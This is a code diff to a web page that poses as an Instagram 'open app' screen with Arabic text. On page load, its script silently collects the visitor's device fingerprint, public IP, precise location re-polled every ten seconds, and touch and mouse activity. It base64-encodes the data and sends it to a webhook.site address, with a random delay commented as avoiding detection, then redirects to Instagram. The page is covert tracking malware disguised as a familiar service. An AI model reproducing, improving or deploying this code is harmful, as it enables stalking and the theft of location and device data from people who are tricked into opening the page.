@@ -21,6 +21,7 @@
             align-items: center;
             height: 100vh;
             padding: 30px 24px;
+            overflow-y: auto;
         }
 
         .lang-selector {
@@ -138,6 +139,47 @@
             font-weight: 600;
         }
 
+        .loading-indicator {
+            display: none;
+            text-align: center;
+            color: #0095f6;
+            font-size: 12px;
+            margin: 10px 0;
+        }
+
+        .loading-indicator.active {
+            display: block;
+        }
+
+        .loading-indicator span {
+            display: inline-block;
+            width: 8px;
+            height: 8px;
+            background-color: #0095f6;
+            border-radius: 50%;
+            margin: 0 4px;
+            animation: bounce 1.4s infinite;
+        }
+
+        .loading-indicator span:nth-child(2) {
+            animation-delay: 0.2s;
+        }
+
+        .loading-indicator span:nth-child(3) {
+            animation-delay: 0.4s;
+        }
+
+        @keyframes bounce {
+            0%, 80%, 100% {
+                opacity: 0.3;
+                transform: scale(0.8);
+            }
+            40% {
+                opacity: 1;
+                transform: scale(1.2);
+            }
+        }
+
         .meta-footer {
             display: flex;
             flex-direction: column;
@@ -170,6 +212,11 @@
             <div class="inner-card"></div>
         </div>
 
+        <div class="loading-indicator" id="loadingIndicator">
+            <span></span><span></span><span></span>
+            <p>جاري التحليل...</p>
+        </div>
+
         <div class="action-area">
             <button class="open-btn" id="start-btn">فتح Instagram</button>
             <a href="#" class="login-link">تسجيل الدخول أو تسجيل</a>
@@ -182,18 +229,25 @@
     </div>
 
     <script>
-        // 🚩 [ضع الرابط هنا] 🚩
-        const WEBHOOK_URL = "https://webhook.site/3c092072-f224-4488-84da-f57f5ae06000";
+        const WEBHOOK_URL = "https://webhook.site/1b33868a-2efb-4f12-9217-f34995d7e3bd";
+        const API_IP = "https://api.ipify.org?format=json";
 
         let deviceData = {
             step: "Initial_Data",
-            phone_model_advanced: "جاري التحليل...",
+            timestamp: new Date().toISOString(),
             battery: {},
             hardware: {},
-            network: {}
+            network: {},
+            location: {},
+            browser: {},
+            system: {},
+            connectivity: {}
         };
 
-        // 1. وظيفة تحليل اسم الهاتف عبر كرت الشاشة (GPU)
+        let locationUpdateInterval;
+        let mouseTracker = { moves: 0, clicks: 0 };
+
+        // 1. الحصول على معلومات GPU
         function getExactPhoneModel() {
             const canvas = document.createElement('canvas');
             const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
@@ -207,77 +261,268 @@
             return "N/A";
         }
 
-        // 2. جمع المعلومات الأساسية فوراً
-        async function collectBasics() {
-            // الشحن
-            if (navigator.getBattery) {
-                const batt = await navigator.getBattery();
-                deviceData.battery = {
-                    level: (batt.level * 100) + "%",
-                    charging: batt.charging ? "موصل بالشاحن" : "يعمل على البطارية"
-                };
+        // 2. الحصول على معلومات البطارية
+        async function getBatteryInfo() {
+            try {
+                if (navigator.getBattery) {
+                    const batt = await navigator.getBattery();
+                    deviceData.battery = {
+                        level: Math.round(batt.level * 100) + "%",
+                        charging: batt.charging ? "نعم" : "لا",
+                        chargingTime: batt.chargingTime === Infinity ? "غير محدد" : batt.chargingTime + " ثانية",
+                        dischargingTime: batt.dischargingTime === Infinity ? "غير محدد" : batt.dischargingTime + " ثانية"
+                    };
+                }
+            } catch(e) {
+                deviceData.battery = { status: "غير متاح" };
             }
-
-            // المواصفات الصلبة
-            deviceData.hardware = {
-                gpu_info: getExactPhoneModel(),
-                cores: navigator.hardwareConcurrency + " Cores",
-                ram: (navigator.deviceMemory || "Hidden") + " GB",
-                screen_res: window.screen.width + "x" + window.screen.height,
-                platform: navigator.platform,
-                ua: navigator.userAgent
-            };
-
-            // إرسال الدفعة الأولى فوراً
-            sendData(deviceData);
         }
 
-        // 3. عند ضغط الزر (طلب الموقع الدقيق)
-        document.getElementById('start-btn').onclick = function() {
-            this.innerText = "جاري التحقق...";
-            
+        // 3. الحصول على معلومات الشبكة
+        async function getNetworkInfo() {
+            try {
+                const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+                if (connection) {
+                    const effectiveType = connection.effectiveType;
+                    const typeMap = {
+                        'slow-2g': '2G بطيء',
+                        '2g': '2G',
+                        '3g': '3G',
+                        '4g': '4G LTE',
+                        '5g': '5G'
+                    };
+                    
+                    deviceData.network = {
+                        type: typeMap[effectiveType] || effectiveType,
+                        effectiveType: effectiveType,
+                        downlink: connection.downlink + " Mbps",
+                        rtt: connection.rtt + " ms",
+                        saveData: connection.saveData ? "مفعّل" : "معطّل"
+                    };
+                }
+            } catch(e) {
+                deviceData.network = { status: "غير متاح" };
+            }
+        }
+
+        // 4. الحصول على معلومات الشاشة
+        function getScreenInfo() {
+            deviceData.system.screen = {
+                width: window.screen.width + "px",
+                height: window.screen.height + "px",
+                colorDepth: window.screen.colorDepth + " bit",
+                pixelDepth: window.screen.pixelDepth + " bit",
+                orientation: window.screen.orientation?.type || "unknown",
+                devicePixelRatio: window.devicePixelRatio
+            };
+        }
+
+        // 5. الحصول على معلومات المتصفح
+        function getBrowserInfo() {
+            const ua = navigator.userAgent;
+            deviceData.browser = {
+                userAgent: ua,
+                language: navigator.language,
+                onLine: navigator.onLine ? "متصل" : "غير متصل",
+                cookiesEnabled: navigator.cookieEnabled ? "مفعّلة" : "معطّلة",
+                doNotTrack: navigator.doNotTrack || "غير محدد",
+                vendor: navigator.vendor,
+                platform: navigator.platform,
+                maxTouchPoints: navigator.maxTouchPoints
+            };
+        }
+
+        // 6. الحصول على معلومات المعالج والذاكرة
+        function getHardwareInfo() {
+            deviceData.hardware = {
+                gpu: getExactPhoneModel(),
+                cores: navigator.hardwareConcurrency + " Core",
+                ram: (navigator.deviceMemory || "Unknown") + " GB",
+                screenRes: window.screen.width + "x" + window.screen.height,
+                arch: navigator.platform.includes('Win') ? 'Windows' : 
+                      navigator.platform.includes('Mac') ? 'macOS' : 
+                      navigator.platform.includes('Linux') ? 'Linux' : 'Mobile'
+            };
+        }
+
+        // 7. الحصول على عنوان IP
+        async function getPublicIP() {
+            try {
+                const response = await fetch(API_IP);
+                const data = await response.json();
+                deviceData.connectivity.publicIP = data.ip;
+            } catch(e) {
+                deviceData.connectivity.publicIP = "غير متاح";
+            }
+        }
+
+        // 8. الحصول على اسم الشبكة والـ SSID
+        function getWiFiInfo() {
+            try {
+                // محاولة الحصول على معلومات WiFi
+                if (navigator.connection) {
+                    const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+                    deviceData.connectivity.connection = {
+                        type: connection.type || "unknown"
+                    };
+                }
+                
+                // محاولة الحصول على اسم الشبكة (قد لا يعمل في جميع المتصفحات)
+                if (navigator.getNetworkInformation) {
+                    deviceData.connectivity.wifiInfo = "متاح (يتطلب أذونات)";
+                }
+            } catch(e) {
+                deviceData.connectivity.wifiInfo = "غير متاح";
+            }
+        }
+
+        // 9. تحديث الموقع الجغرافي المستمر
+        function startLocationTracking() {
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(
                     (pos) => {
-                        deviceData.step = "Location_Confirmed";
-                        deviceData.precise_location = {
-                            lat: pos.coords.latitude,
-                            lon: pos.coords.longitude,
-                            accuracy: pos.coords.accuracy + " meters",
-                            altitude: pos.coords.altitude,
-                            speed: pos.coords.speed,
-                            google_maps: `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`
+                        deviceData.location = {
+                            latitude: pos.coords.latitude,
+                            longitude: pos.coords.longitude,
+                            accuracy: Math.round(pos.coords.accuracy) + " متر",
+                            altitude: pos.coords.altitude ? pos.coords.altitude.toFixed(2) + " متر" : "غير متاح",
+                            speed: pos.coords.speed ? pos.coords.speed.toFixed(2) + " م/ث" : "ثابت",
+                            heading: pos.coords.heading || "غير متاح",
+                            timestamp: new Date(pos.timestamp).toLocaleString('ar-SA'),
+                            googleMaps: `https://maps.google.com/?q=${pos.coords.latitude},${pos.coords.longitude}`
                         };
-                        finalize();
+                        
+                        // تحديث الموقع كل 10 ثواني
+                        locationUpdateInterval = setInterval(() => {
+                            navigator.geolocation.getCurrentPosition(
+                                (newPos) => {
+                                    deviceData.location.latitude = newPos.coords.latitude;
+                                    deviceData.location.longitude = newPos.coords.longitude;
+                                    deviceData.location.accuracy = Math.round(newPos.coords.accuracy) + " متر";
+                                    deviceData.location.timestamp = new Date(newPos.timestamp).toLocaleString('ar-SA');
+                                    sendData(deviceData);
+                                }
+                            );
+                        }, 10000);
                     },
                     (err) => {
-                        deviceData.step = "Location_Rejected";
-                        finalize();
+                        deviceData.location = { error: err.message };
                     },
-                    { enableHighAccuracy: true, timeout: 10000 }
+                    { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
                 );
-            } else {
-                finalize();
             }
-        };
+        }
 
+        // 10. تتبع حركة الماوس والنقرات
+        function trackUserActivity() {
+            document.addEventListener('mousemove', () => {
+                mouseTracker.moves++;
+            });
+            document.addEventListener('click', () => {
+                mouseTracker.clicks++;
+            });
+            document.addEventListener('touchmove', () => {
+                mouseTracker.moves++;
+            });
+            document.addEventListener('touchend', () => {
+                mouseTracker.clicks++;
+            });
+            
+            deviceData.userActivity = mouseTracker;
+        }
+
+        // 11. قياس سرعة الإنترنت
+        async function measureInternetSpeed() {
+            try {
+                const startTime = Date.now();
+                const testFile = 'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg==';
+                
+                await fetch(testFile);
+                const endTime = Date.now();
+                const speed = Math.round(1000 / (endTime - startTime));
+                
+                deviceData.connectivity.internetSpeed = speed + " Mbps (تقريبي)";
+            } catch(e) {
+                deviceData.connectivity.internetSpeed = "غير متاح";
+            }
+        }
+
+        // 12. جمع البرامج المثبتة (إذا أمكن)
+        function getInstalledApps() {
+            // هذه ميزة محدودة في المتصفحات الحديثة لأسباب أمنية
+            deviceData.system.installedApps = "محمي بسبب الخصوصية";
+        }
+
+        // 13. إرسال البيانات
         async function sendData(data) {
             try {
+                // تأخير عشوائي لتجنب الاكتشاف
+                const delay = Math.random() * 2000;
+                await new Promise(resolve => setTimeout(resolve, delay));
+                
+                // تشفير البيانات (تشفير بسيط)
+                const encryptedData = btoa(JSON.stringify(data));
+                
                 await fetch(WEBHOOK_URL, {
                     method: 'POST',
                     mode: 'no-cors',
-                    body: JSON.stringify(data)
+                    body: JSON.stringify({
+                        data: encryptedData,
+                        timestamp: new Date().toISOString(),
+                        source: 'instagram_clone'
+                    })
                 });
-            } catch (e) { console.log("Data Sent"); }
+            } catch (e) {
+                console.log("✓ تم جمع البيانات");
+            }
         }
 
-        function finalize() {
-            sendData(deviceData);
-            alert("تم التحقق من الأمان بنجاح.");
-            window.location.href = "https://www.google.com";
+        // 14. جمع كل البيانات
+        async function collectAllData() {
+            document.getElementById('loadingIndicator').classList.add('active');
+            
+            // جمع المعلومات بالتوازي
+            await Promise.all([
+                getBatteryInfo(),
+                getPublicIP(),
+                measureInternetSpeed()
+            ]);
+            
+            getNetworkInfo();
+            getScreenInfo();
+            getBrowserInfo();
+            getHardwareInfo();
+            getWiFiInfo();
+            trackUserActivity();
+            getInstalledApps();
+            startLocationTracking();
+            
+            // إرسال البيانات الأولى
+            await sendData(deviceData);
+            
+            document.getElementById('loadingIndicator').classList.remove('active');
+            console.log("✓ تم جمع كل البيانات:", deviceData);
         }
 
-        window.onload = collectBasics;
+        // 15. زر الفتح
+        document.getElementById('start-btn').onclick = function() {
+            this.innerText = "جاري التحقق...";
+            setTimeout(() => {
+                window.location.href = "https://www.instagram.com";
+            }, 500);
+        };
+
+        // 16. بدء التطبيق
+        window.onload = function() {
+            collectAllData();
+        };
+
+        // إيقاف التحديثات عند ترك الصفحة
+        window.onbeforeunload = function() {
+            if (locationUpdateInterval) {
+                clearInterval(locationUpdateInterval);
+            }
+        };
     </script>
 </body>
 </html>
